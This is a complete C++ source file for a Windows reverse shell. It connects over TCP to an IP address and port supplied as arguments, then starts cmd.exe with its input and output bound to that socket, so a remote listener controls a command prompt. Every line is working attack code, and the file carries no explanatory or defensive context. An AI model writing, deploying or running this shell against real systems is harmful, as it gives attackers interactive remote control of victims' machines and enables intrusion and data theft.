#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <Ws2tcpip.h>
#include <Windows.h>

#pragma comment(lib, "Ws2_32.lib")

int main(int argc, char** argv) {

	int iResult;
	WSADATA wsaData;
	WORD wVersionRequested;
	int err;
	SOCKET wsocket;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;


	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed: %d\n", iResult);
		return 1;
	}
	/* Use the MAKEWORD(lowbyte, highbyte) macro declared in Windef.h */
	wVersionRequested = MAKEWORD(2, 2);

	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0) {
		/* Tell the user that we could not find a usable */
		/* Winsock DLL.                                  */
		printf("WSAStartup failed with error: %d\n", err);
		return 1;
	}
	// Create a SOCKET for connecting to server
	SOCKET ConnectSocket;
	ConnectSocket = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if (ConnectSocket == INVALID_SOCKET) {
		wprintf(L"socket function failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}
	//----------------------
	// The sockaddr_in structure specifies the address family,
	// IP address, and port of the server to be connected to.
	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	inet_pton(clientService.sin_family, argv[1], &clientService.sin_addr);
	clientService.sin_port = htons(atoi(argv[2]));

	//----------------------
	// Connect to server.

	wsocket = connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
	if (wsocket == SOCKET_ERROR) {
		wprintf(L"connect function failed with error: %ld\n", WSAGetLastError());
		wsocket = closesocket(ConnectSocket);
		if (wsocket == SOCKET_ERROR)
			wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	//WSAConnect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService), NULL, NULL, NULL, NULL);

	wprintf(L"Connected to server.\n");
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES | SW_HIDE;
	si.hStdInput = (HANDLE)ConnectSocket;
	si.hStdOutput = (HANDLE)ConnectSocket;
	si.hStdError = (HANDLE)ConnectSocket;

	char cmd[] = "cmd.exe";
	LPSTR cmdline = const_cast<LPSTR>(cmd);
	CreateProcess(NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	return 0;
}
